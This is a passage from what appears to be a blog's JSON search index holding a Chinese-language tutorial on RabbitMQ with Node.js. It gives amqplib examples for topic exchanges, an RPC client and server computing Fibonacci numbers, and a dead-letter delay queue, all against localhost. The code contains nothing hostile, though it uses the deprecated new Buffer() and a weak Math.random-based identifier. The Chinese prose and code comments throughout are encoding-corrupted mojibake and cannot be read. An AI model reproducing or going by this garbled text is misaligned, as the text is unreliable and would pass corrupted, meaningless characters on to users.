console.log(' [*] Waiting for logs. To exit press CTRL+C'); args.forEach(async key =\u003e { await ch.bindQueue(q.queue, ex, key); //ç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ— }); ch.consume(q.queue, msg =\u003e { //è®¢é˜…é˜Ÿåˆ—æ¥æ”¶æ¶ˆæ¯ console.log(\" [x] %s:'%s'\", msg.fields.routingKey, msg.content.toString()); }, { noAck: true }); } catch (error) { console.log(error); } })() ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ï¼ˆemit_log_topic.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const ex = 'topic_logs'; const args = process.argv.slice(2); const key = (args.length \u003e 0) ? args[0] : 'anonymous.info'; const msg = args.slice(1).join(' ') || 'Hello World!'; await ch.assertExchange(ex, 'topic', { durable: false }); //å£°æ˜äº¤æ¢å™¨ ch.publish(ex, key, new Buffer(msg)); //å‘é€æ¶ˆæ¯ï¼ŒæŒ‡å®š routing key console.log(\" [x] Sent %s: '%s'\", key, msg); await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } catch (error) { console.log(error); } })() äº¤æ¢å™¨çš„ topic ç±»å‹ï¼Œåªéœ€æ³¨æ„æ¨¡ç³ŠåŒ¹é…çš„è§„åˆ™å³å¯ï¼Œç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—çš„ binding key ä»¥ç¬¦å· . å°†å­—ç¬¦ä¸²åˆ†éš”ä¸ºä¸åŒçš„å•è¯ï¼ˆä¸ä¸€å®šæ˜¯çœŸå®çš„å•è¯ï¼Œç†è§£ä¸ºä¸€ä¸ªéƒ¨åˆ†å°±è¡Œäº†ï¼‰ï¼Œç¬¦å· * ç”¨äºåŒ¹é…ä»»æ„ä¸€ä¸ªå•è¯ï¼Œç¬¦å· # ç”¨äºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå•è¯ã€‚ å…¶å®ä½ ä¼šå‘ç°æœ¬èŠ‚ä¸‰ä¸ªç¤ºä¾‹ä¸­çš„å¤§éƒ¨åˆ†åœ°æ–¹éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œå”¯ä¸€ä¸åŒçš„åœ°æ–¹å°±æ˜¯ä¸åŒçš„äº¤æ¢å™¨ç±»å‹éœ€è¦å¯¹ binding key å’Œ routing key è¿›è¡Œä¸åŒçš„å¤„ç†ã€‚é€šè¿‡æœ¬èŠ‚äº†è§£äº†ä¸åŒçš„äº¤æ¢å™¨ç±»å‹ï¼Œæœ‰åŠ©äºä½ åœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œå…·ä½“çš„è·¯ç”±è§„åˆ™è®¾è®¡ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:3:3","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"å›› ","date":"2018-02-27","objectID":"/rabbitmq/:4:0","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"RPC RPC æ˜¯ä»€ä¹ˆï¼ŸRemote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œæ¯”å¦‚æŸä¸ªæœåŠ¡å™¨è°ƒç”¨å¦ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å‡½æ•°æˆ–æ–¹æ³•è·å–å…¶ç»“æœï¼Œå½“ç„¶è¿™ç§ç±»ä¼¼éœ€æ±‚æ¯«æ— ç–‘é—®æ˜¯å¯ä»¥ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ REST æ¥å®ç°çš„ã€‚ ä½¿ç”¨ RabbitMQ å¦‚ä½•å®ç° RPC çš„åŠŸèƒ½ï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚åˆ°ä¸€ä¸ª rpc é˜Ÿåˆ—ï¼Œå¹¶æŒ‡å®šä¸€ä¸ª correlationId ä½œä¸ºè¯¥è¯·æ±‚çš„å”¯ä¸€æ ‡è¯†ï¼Œä¸”é€šè¿‡ reply_to æŒ‡å®šä¸€ä¸ª callback é˜Ÿåˆ—æ¥æ”¶è¯·æ±‚å¤„ç†ç»“æœï¼ˆè¿™é‡Œçš„ callback å¹¶ä¸æ˜¯æŒ‡ node ä¸­çš„å›æ‰å‡½æ•°ï¼Œæ³¨æ„åŒºåˆ«ï¼‰ã€‚æœåŠ¡ç«¯é€šè¿‡è®¢é˜…æŒ‡å®šçš„ rpc é˜Ÿåˆ—æ¥æ”¶åˆ°è¯·æ±‚ç„¶åè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä¹‹åå°†ç»“æœå‘é€åˆ° reply_to æŒ‡å®šçš„ callback é˜Ÿåˆ—ä¸­ï¼Œå®¢æˆ·ç«¯é€šè¿‡è®¢é˜… callback é˜Ÿåˆ—è·å–è¯·æ±‚ç»“æœï¼Œå¹¶é€šè¿‡ correlationId å¯¹åº”ä¸åŒçš„è¯·æ±‚ã€‚ å®¢æˆ·ç«¯ç¤ºä¾‹ï¼ˆrpc_client.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const args = process.argv.slice(2); if (args.length === 0) { console.log(\"Usage: rpc_client.js num\"); process.exit(1); } const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const q = await ch.assertQueue('', { exclusive: true }); //å£°æ˜ä¸€ä¸ªä¸´æ—¶é˜Ÿåˆ—ä½œä¸º callback æ¥æ”¶ç»“æœ const corr = generateUuid(); const num = parseInt(args[0]); console.log(' [x] Requesting fib(%d)', num); ch.consume(q.queue, async (msg) =\u003e { //è®¢é˜… callback é˜Ÿåˆ—æ¥æ”¶ RPC ç»“æœ if (msg.properties.correlationId === corr) { //æ ¹æ® correlationId åˆ¤æ–­æ˜¯å¦ä¸ºè¯·æ±‚çš„ç»“æœ console.log(' [.] Got %s', msg.content.toString()); await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ } }, { noAck: true }); ch.sendToQueue('rpc_queue', //å‘é€ RPC è¯·æ±‚ new Buffer(num.toString()), { correlationId: corr, // correlationId å°† RPC ç»“æœä¸å¯¹åº”çš„è¯·æ±‚å…³è”ï¼ŒreplyTo æŒ‡å®šç»“æœè¿”å›çš„é˜Ÿåˆ— replyTo: q.queue } ); } catch (error) { console.log(error); } })(); function generateUuid() { //å”¯ä¸€æ ‡è¯† return Math.random().toString() + Math.random().toString() + Math.random().toString(); } æœåŠ¡ç«¯ç¤ºä¾‹ï¼ˆrpc_server.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const q = 'rpc_queue'; await ch.assertQueue(q, { durable: false }); //å£°æ˜é˜Ÿåˆ— await ch.prefetch(1); //æ¯æ¬¡æœ€å¤§æ¥æ”¶æ¶ˆæ¯æ•°é‡ console.log(' [x] Awaiting RPC requests'); ch.consume(q, function reply(msg) { //è®¢é˜… RPC é˜Ÿåˆ—æ¥æ”¶è¯·æ±‚ const n = parseInt(msg.content.toString()); console.log(\" [.] fib(%d)\", n); const r = fibonacci(n); //è°ƒç”¨æœ¬åœ°å‡½æ•°è®¡ç®—ç»“æœ ch.sendToQueue(msg.properties.replyTo, //å°† RPC è¯·æ±‚ç»“æœå‘é€åˆ° callback é˜Ÿåˆ— new Buffer(r.toString()), { correlationId: msg.properties.correlationId } ); ch.ack(msg); }); } catch (error) { console.log(error); } })(); function fibonacci(n) { //æ—¶é—´å¤æ‚åº¦æ¯”è¾ƒé«˜ let cache = {}; if (n === 0 || n === 1) return n; else return fibonacci(n - 1) + fibonacci(n - 2); } ä¸Šè¿°å°±æ˜¯ä¸€ä¸ªç®€å•çš„ RPC ç¤ºä¾‹ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:4:1","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"å»¶æ—¶é˜Ÿåˆ— æŸäº›åœºæ™¯ä¸‹æˆ‘ä»¬å¹¶ä¸å¸Œæœ›ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯åï¼Œæ¶ˆè´¹è€…ç«‹å³å°±æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œè€Œæ˜¯å»¶è¿Ÿä¸€æ®µæ—¶é—´ï¼Œæ¯”å¦‚æŸä¸ªè®¢å•æäº¤ååäº”åˆ†é’Ÿå†…æœªæ”¯ä»˜åˆ™è‡ªåŠ¨å–æ¶ˆè¿™ç§æƒ…å†µå°±å¯ä»¥ç”¨å»¶æ—¶é˜Ÿåˆ—ã€‚ RabbitMQ æœ¬èº«å¹¶æ²¡æœ‰ç›´æ¥æ”¯æŒå»¶æ—¶é˜Ÿåˆ—è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦ç®€å•çš„æ‹ä¸ªå¼¯é—´æ¥å®ç°ï¼š å…·ä½“æµç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç”Ÿäº§è€…å…ˆå°†æ¶ˆæ¯æŠ•é€’åˆ°ä¸€ä¸ªæ­»ä¿¡é˜Ÿåˆ—ä¸­ï¼Œæ¶ˆæ¯åœ¨æ­»ä¿¡é˜Ÿåˆ—ä¸­å»¶æ—¶ï¼Œå¹¶æŒ‡å®š deadLetterExchange ä¹Ÿå°±æ˜¯æ¶ˆæ¯å»¶æ—¶ç»“æŸåé‡æ–°åˆ†å‘åˆ°çš„äº¤æ¢å™¨ï¼Œä»¥åŠ deadLetterRoutingKeyï¼Œé‡æ–°åˆ†å‘åçš„äº¤æ¢å™¨æ®æ­¤å°†æ¶ˆæ¯åˆ†å‘åˆ°å¦ä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ¶ˆè´¹è€…è®¢é˜…æ­¤é˜Ÿåˆ—ä»¥æ¥å—æ¶ˆæ¯ã€‚ äº¤æ¢å™¨ä¸é˜Ÿåˆ—ä¸€å®šæ˜¯ä¸€èµ·å‡ºç°çš„ï¼Œå³ä½¿æˆ‘ä»¬ä½¿ç”¨äº†é»˜è®¤äº¤æ¢å™¨ï¼Œåœ¨ä»£ç ä¸­æ— æ„Ÿï¼Œä¹Ÿè¦ç‰¢è®°å®ƒçš„å­˜åœ¨ã€‚åŒæ ·ä¸Šå›¾æ‰€ç¤ºåœ¨å»¶æ—¶é˜Ÿåˆ—ä¸­ä½¿ç”¨çš„ä¸¤ä¸ªäº¤æ¢å™¨éƒ½å¯ä»¥ä¸ºé»˜è®¤äº¤æ¢å™¨ï¼Œåªè¦æˆ‘ä»¬å®šä¹‰ä¸åŒçš„ç»‘å®šè§„åˆ™å³å¯ã€‚ æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ç¤ºä¾‹ï¼ˆreceive.jsï¼‰ï¼š const amqp = require('amqplib'); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const queueName = 'delay-queue-consumer'; await ch.assertQueue(queueName, { durable: false }); //å£°æ˜é˜Ÿåˆ—ï¼Œdurableï¼šfalse ä¸å¯¹é˜Ÿåˆ—æŒä¹…åŒ– console.log(\" [*] Waiting for messages in queue: %s. To exit press CTRL+C\", queueName); ch.consume(queueName, msg =\u003e { //è®¢é˜…é˜Ÿåˆ—æ¥å—æ¶ˆæ¯ console.log(\" [x] Received %s\", msg.content.toString()); }, { noAck: true }); // noAckï¼štrue ä¸è¿›è¡Œç¡®è®¤æ¥å—åº”ç­” } catch (error) { console.log(error); } })() ç”Ÿäº§è€…æŠ•é€’æ¶ˆæ¯ç¤ºä¾‹ï¼ˆsend.jsï¼‰ï¼š const amqp = require('amqplib'); const EventEmitter = require('events'); class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter(); (async () =\u003e { try { const conn = await amqp.connect('amqp://localhost'); //å»ºç«‹è¿æ¥ const ch = await conn.createChannel(); //å»ºç«‹ä¿¡é“ const msg = 'Hello world'; const queueName = 'delay-queue-consumer'; await ch.assertQueue(queueName, { durable: false }); //æ¶ˆæ¯å»¶æ—¶ç»“æŸåä¼šè¢«è½¬å‘åˆ°æ­¤é˜Ÿåˆ—ï¼Œæ¶ˆè´¹è€…ç›´æ¥è®¢é˜…æ­¤é˜Ÿåˆ—å³å¯ await ch.assertQueue('delay-queue-dead-letter', { //å®šä¹‰æ­»ä¿¡é˜Ÿåˆ— durable: false, deadLetterExchange: '', //ç›´æ¥ä½¿ç”¨é»˜è®¤äº¤æ¢å™¨ deadLetterRoutingKey: 'delay-queue-consumer', //é»˜è®¤äº¤æ¢å™¨è·¯ç”±é”®å°±æ˜¯é˜Ÿåˆ—å messageTtl: 5000 //å»¶æ—¶ ms }); for (let i = 0; i \u003c 5; i++) { setTimeout(() =\u003e { ch.sendToQueue('delay-queue-dead-letter', new Buffer(msg+i)); //å‘é€æ¶ˆæ¯ console.log(' [x] Sent %s', msg+i); if (i == 4) { myEmitter.emit('sent done'); } }, 5000*i) } myEmitter.on('sent done', async () =\u003e { await ch.close(); //å…³é—­ä¿¡é“ await conn.close(); //å…³é—­è¿æ¥ }); } catch (error) { console.log(error); } })() ç¤ºä¾‹å°±å†™è¿™ä¹ˆå¤šï¼Œå…¨æ–‡å®Œã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:4:2","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"}]